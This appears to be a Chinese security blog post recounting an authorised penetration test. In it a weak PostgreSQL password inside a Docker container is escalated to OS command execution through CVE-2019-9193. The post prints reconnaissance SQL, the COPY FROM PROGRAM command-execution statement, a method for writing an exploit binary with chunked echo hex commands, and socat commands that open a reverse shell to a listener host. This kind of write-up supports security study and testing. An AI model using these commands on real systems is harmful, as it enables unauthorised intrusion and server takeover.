#  第22篇：一次艰难的PostgreSQL不出网提权过程

原创 abc123info [ 网络安全abc123 ](javascript:void\(0\);)

**网络安全abc123** ![]()

微信号 abc123network

功能介绍 ABC_123，2008年入行网络安全，某攻防实验室创始人，Struts2工具及Weblogic
T3/IIOP反序列化工具原创作者。擅长红队攻防、0day挖掘、代码审计、网络安全培训、应急响应、日志分析等。专注于前沿网络安全技术。

____

___发表于_

收录于合集

#攻防比赛 16 个

#红队 13 个

#内网渗透 3 个

#提权 1 个

#PostgreSQL 1 个

![](https://gitee.com/fuli009/images/raw/master/public/20220923140028.png)**
Part1 前言
**在日常的内网横向过程中，对于SMB、Mysql、SSH、Sqlserver、Oracle等服务的弱口令爆破是常用手段，重复的红队攻防比赛使得这些服务的弱口令越来越少了。所以在平时，
**ABC_123也会关注一些其它服务的弱口令提权方法** ，有时候会在内网横向中收到奇效。本期就分享一个在内网渗透中，遇到的
**PostgreSQL数据库提权案例**
，过程非常艰辛，但是收获不少。首先简单介绍一下当时的渗透测试工作进展情况：前期通过外围打点进入了一个大B段的内网，内网非常庞大，但是资产极其稀少，在客户授权的情况下，一通B段探测，仅仅发现了一个Postgres弱口令，而且
**这个PostgreSQL是在docker容器中的，是非root权限起的服务**
，也就说内网只有这一个突破口。通过查看目录，发现一些目录有很多开发留下来的配置文件，但是需要root权限才能读取到。所以，接下来的要做的事情非常明确，就是提权到Linux服务器最高权限。
**此文章抛砖引玉，如果 大家有更好的方法，欢迎微信后台给我发消息讨论。**  
 **  Part2 技术研究过程 **

  *  **对于PostgreSQL信息探测**

首先按照惯例，肯定是需要对PostgreSQL数据库进行一系列信息收集的，常用的命令有以下这些：\-- 版本信息select version();show
server_version;  
select pg_read_file('PG_VERSION', 0, 200);  
\-- 数字版本信息包括小版号SHOW server_version_num;SELECT
current_setting('server_version_num');  
\-- 获取安装目录（通过路径可以判断系统是linux还是windows的）select setting from pg_settings where
name = 'data_directory';  
\-- 获取配置文件路径selectsetting from pg_settings where name='config_file'  
\-- 获取Postgres内网ip地址select
inet_server_addr()![](https://gitee.com/fuli009/images/raw/master/public/20220923140029.png)  

  *  **PostgreSQL提权漏洞尝试**

通过各种搜索，发现PostgreSQL曾经爆出过三个有价值的提权漏洞：其中一个漏洞是 **CVE-2018-1058**
，漏洞描述是“PostgreSQL的9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作”。在网上看了几篇漏洞复现文章之后，感觉这个漏洞不太好利用，
**提权成功需要等待“超级用户触发”**
，而且这个漏洞是“把一个普通的数据库用户权限提升到数据库管理员权限”，而我们需要的是一个Linux服务器权限，所以这个CVE漏洞不适用于本次测试工作。另一个方法是PostgreSQL的
**UDF提权** 执行命令方法，但是本次环境用不成功，而且用起来挺麻烦的。

还找到一个漏洞是 **CVE-2019-9193**
，这个漏洞看起来非常好，可以直接执行系统命令，还可以看到回显结果。使用起来也比较简单。如下图所示，这个postgres数据库没有root权限。

![](https://gitee.com/fuli009/images/raw/master/public/20220923140030.png)  
  

  * ##  **Linux提权操作却无gcc**

通过postgreSQL提权漏洞，我们可以执行linux系统命令了，接下来需要提权到服务器的root权限。我想到的方法是上传一个提权exp，通过linux系统漏洞提权到root权限。可是操作起来没那么简单，
**因为这个docker容器没装gcc**
。这种情况也有解决办法，准备一个相似的docker环境，编译好一个exp，将此二进制文件传到服务器上即可运行成功。![](https://gitee.com/fuli009/images/raw/master/public/20220923140031.png)  

  * ##  **echo命令写二进制文件**

编译后的提权文件做好了，但是此postgres的docker环境太精简了，很多程序都没有：wget命令不存在、curl不存在、python不存在，而且服务器还不出网，所以通过下载文件方式去写入提权文件，看来不太好弄。
**那么只能直接写二进制文件了** ，可是问题又来了，| base64 -d 命令不存在、|xxd -r -ps
命令也不存在，怎么写二进制文件呢？看来只剩下echo命令可用了，经过一系列测试，发现echo是可以直接写入二进制文件的， **命令如下echo -e -n
"\x23" >>
exploit3.bin。比较麻烦的是，需要把二进制文件转成16进制格式的，如下图所示**：![](https://gitee.com/fuli009/images/raw/master/public/20220923140032.png)  
接下来就是与postgres的提权语句结合起来使用了，原有的echo命令是这样的：echo -e -n
"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23" >>
test3.bin但是放在postgres必须用以下这样方式才行，试了好多次，只有这样才能写成功！注意，
**echo左边的是两个单引号，不是双引号，exploit3.bin右边是3个单引号** 。COPY cmd_exec FROM PROGRAM
'/bin/bash -c ''echo -e -n "\x33" >>
exploit3.bin''';最终通过postgres提权漏洞写入提权exp文件的具体语句如下：![](https://gitee.com/fuli009/images/raw/master/public/20220923140034.png)  
最终exploit3.bin文件写入成功了，执行chmod 777 exploit3.bin之后，运行此文件，发现没反应，这时候我才反应过来。。。
**这个提权exp需要交互环境**
！！！接下来我需要传一个nc啥的反弹shell获取交互环境吗？可是nc也不一定能获取纯交互环境呀。我想到了一个好久没用的工具socat，解决了这个问题。  

  * ##  **socat获取交互型shell**

socat这款工具，可以说是nc的升级版本，可以轻松获取到一个纯交互环境，github上有很多绿色免安装版本。执行如下命令后，将会获取到一个完全交互式的TTY会话：Vps上监听端口socat
file:`tty`,raw,echo=0 tcp-listen:8888  
内网服务器上运行socat exec:'bash -li',pty,stderr,setsid,sigint,sane
tcp:10.0.3.4:888888服务器不通外网怎么办呢，正好我们webshell有一台服务器，就反弹到webshell这个服务器上吧。（下图来源于网络）![](https://gitee.com/fuli009/images/raw/master/public/20220923140035.png)  

  * ##  **分割二进制大文件写入成功**

把这个socat单文件转成16进制格式的，通过postgres提权命令执行写入。结果通过ls
-lah命令发现文件并没有写进去，原因在哪里呢？后来发现，COPY cmd_exec FROM PROGRAM **这个语句对二进制文件大小有限制的**
，文件太大写不进去。接下来怎么办？继续干！于是把二进制文件分割开，挨个执行echo -e -n命令叠加写入二进制文件，经过一系列测试发现，
**一个367k大小的socat文件，需要分割成近15份才能写入成功**
。也是我用java写了一个小程序，将socat文件分割成15份，并且自动生成postgres提权命令。
**关注公众号，后台回复“333”，即可获取二进制文件转16进制的java代码文件。**![](https://gitee.com/fuli009/images/raw/master/public/20220923140037.png)  
 **  Part3 总结 ** **1.
**echo命令写二进制文件可以关注一下，遇到大文件，可以把大文件分割成好几份，逐个echo写入，最后叠加成最终的二进制文件。 **2.
**内网横向中不只要关注mssql、redis、oracle的提权，其它的不常用的服务的提权方法，平时也需要多收集。 **3.
**socat这款工具可以获取一个纯交互环境，而且在docker精简环境下仍能正常使用。![](https://gitee.com/fuli009/images/raw/master/public/20220923140038.png)专注于网络安全技术分享，包括红队、蓝队、日常渗透测试、安全体系建设等每周一篇，99%原创，敬请关注![](https://gitee.com/fuli009/images/raw/master/public/20220923140039.png)
**往期精彩回顾**
****[第21篇：判断Weblogic详细版本号的方法总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484386&idx=1&sn=9104bd3fad09c607c0ce4b02e483957d&chksm=c25fcc99f528458f8f29d93f9fb7c961255bb64351061e0d6b0eb0c3fc08f2b660e53d45459d&scene=21#wechat_redirect)  
[第20篇：改造冰蝎客户端适配JNDIExploit的内存马](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484370&idx=1&sn=41144e2b24cf223753b1f631b7a7269b&chksm=c25fcca9f52845bfec4aceb55bbc2e35b95605873193a0a499b9505957039619598ae458b045&scene=21#wechat_redirect)
**[](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484370&idx=1&sn=41144e2b24cf223753b1f631b7a7269b&chksm=c25fcca9f52845bfec4aceb55bbc2e35b95605873193a0a499b9505957039619598ae458b045&scene=21#wechat_redirect)  
**[第19篇：关于近期cs服务端被反打的原因分析](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484349&idx=1&sn=c23223a0348336daae18acc4a4790bb8&chksm=c25fccc6f52845d03b30faae72d252256434197d1267d713e60b85810f734368f0be61e62a06&scene=21#wechat_redirect)[第18篇：fastjson反序列化漏洞区分版本号的方法总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484332&idx=1&sn=c787dd0985156d856aad03d56a945be4&chksm=c25fccd7f52845c1e172b864dfc219dcecc9f226fb5abc64ef31178914ad9f58b7868bf6917a&scene=21#wechat_redirect)[第17篇：Shiro反序列化在Weblogic下无利用链的拿权限方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484319&idx=1&sn=9da36674830837aa9bcacb3fb6268fd1&chksm=c25fcce4f52845f2ac3cebaf17fd3839fdba74f536ad3da20d1b1126d8ba0e1835853990516c&scene=21#wechat_redirect)[第16篇：Weblogic
2019-2729反序列化漏洞绕防护拿权限的实战过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484303&idx=1&sn=58cbb4d7f63b9276bb89eeac286d174c&chksm=c25fccf4f52845e241256c2f425003b73b6061b3d1964dcd4a184a2cda1b4d8761098227e6de&scene=21#wechat_redirect)[第15篇：内网横向中windows各端口远程登录哈希传递的方法总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484255&idx=1&sn=e233aa07fdf9de0c8a1bf56fb0954766&chksm=c25fcc24f5284532c5aa27c002d15aa6380c456e2a84299c77b8d43a41892517087258bf867d&scene=21#wechat_redirect)[第14篇：Struts2框架下Log4j2漏洞检测方法分析与总结](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484207&idx=1&sn=285b54a79e48db9a05816cab2e6afc27&chksm=c25fcc54f5284542c1b9abe870e0caa9f958f4da90723bd83292deed215c63c705b7b0bbfaff&scene=21#wechat_redirect)  
[第13篇：coldfusion反序列化过waf改exp拿靶标的艰难过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484191&idx=1&sn=cce12f62b3cf457bc73753b77a083695&chksm=c25fcc64f528457250b11ef6804ee6138c37ed87ab988874cc84d09d04fa6ac1fd36b5e8aa4a&scene=21#wechat_redirect)  
[第12篇：给任意java程序挂Socks5代理方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484173&idx=1&sn=e2d454d2447d119bf771a0a511fba994&chksm=c25fcc76f5284560d00355590da0147aca7b7ae2275c095424034245ef32b3d0b28e49c2dbc9&scene=21#wechat_redirect)  
[第11篇：盲猜包体对上传漏洞的艰难利用过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484162&idx=1&sn=870596fcd1120a6d3ee9688c38aace00&chksm=c25fcc79f528456f9dc0a3b9d9cf54422696a1cd6ffd737ae2c6e33941a25c33d4f6d32fc663&scene=21#wechat_redirect)  
[第10篇：IIS短文件名猜解在拿权限中的巧用](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484145&idx=1&sn=7635430b9b759a2cacdd2c57ba330833&chksm=c25fcd8af528449c1f5c6c703e3668cf6a8dae875ee82ffa67caed66722a0751e3d80d8a6bee&scene=21#wechat_redirect)  
[第9篇：Shiro反序列化数据包解密及蓝队分析工具，提供下载](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484123&idx=1&sn=cb9c039ef92311e56e7742c7c38f6e8a&chksm=c25fcda0f52844b6088b39b769a63b2f6e7a29e8b3ab710961918218d7569089ee4e00072ad9&scene=21#wechat_redirect)  
[第8篇：Oracle注入漏洞绕waf的新语句](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484115&idx=1&sn=10c73343ec23f522696692293cd38852&chksm=c25fcda8f52844be2165aa6151c7ad018a4add748673d56523631529e903277633dc44d0abba&scene=21#wechat_redirect)  
[第7篇：MS12-020蓝屏漏洞在实战中的巧用](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484105&idx=1&sn=3aeafa9c172588aaaade47ccacb69370&chksm=c25fcdb2f52844a4a783fceec590c9e12eb06f62dabd7fbffb37e8da23053953a7eae296048d&scene=21#wechat_redirect)  
[第6篇：Weblogic反序列化攻击不依赖日志溯源攻击时间](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484094&idx=1&sn=527236759dc4fd228461195197492507&chksm=c25fcdc5f52844d36bffb96979116d6d3a9ae4fb1a0f320436c7275aea271588c702cea60e5c&scene=21#wechat_redirect)  
[第5篇：Shiro Padding
Oracle无key的艰难实战利用过程](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484091&idx=1&sn=4dcce59a842f17035d0018bf650671ae&chksm=c25fcdc0f52844d608b6b87d85082b74d5e15888e76001127ff40cc407a46e5e5de446b1365e&scene=21#wechat_redirect)  
[第4篇：jsp型webshell被删情况下如何溯源攻击时间](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247484004&idx=1&sn=50013b50e48542d156700d76ccbd2f33&chksm=c25fcd1ff528440906bb9089a807c16b747ab5a72cc0279a3c0d18a265cd76cc796df570d594&scene=21#wechat_redirect)  
[第3篇：银行Java站SSRF"组合洞"打法造成的严重危害](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483984&idx=1&sn=1a018fcefe10124c1726e51a2be05ca7&chksm=c25fcd2bf528443d944a8495ca5c72d8c028fef67de217efe47a8d18b077ae24556842687407&scene=21#wechat_redirect)  
[第2篇：区分Spring与Struts2框架的几种新方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483951&idx=1&sn=fbc1d04ef73a449238a5979a439b1f35&chksm=c25fcd54f528444219f20c2ab14c5970c243fbb10ba04b5bccc0fb0b7cc6d3f542e26f7870bf&scene=21#wechat_redirect)  
[第1篇：weblogic9.x在JDK1.5下T3反序列化漏洞利用方法](http://mp.weixin.qq.com/s?__biz=MzkzMjI1NjI3Ng==&mid=2247483867&idx=1&sn=e0fcaa9f1b58c8085ccd9dc6f74ed336&chksm=c25fcea0f52847b6aeec0409e3290e023b890d603361f103315b39637f89a10dd6fe051dc724&scene=21#wechat_redirect)

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

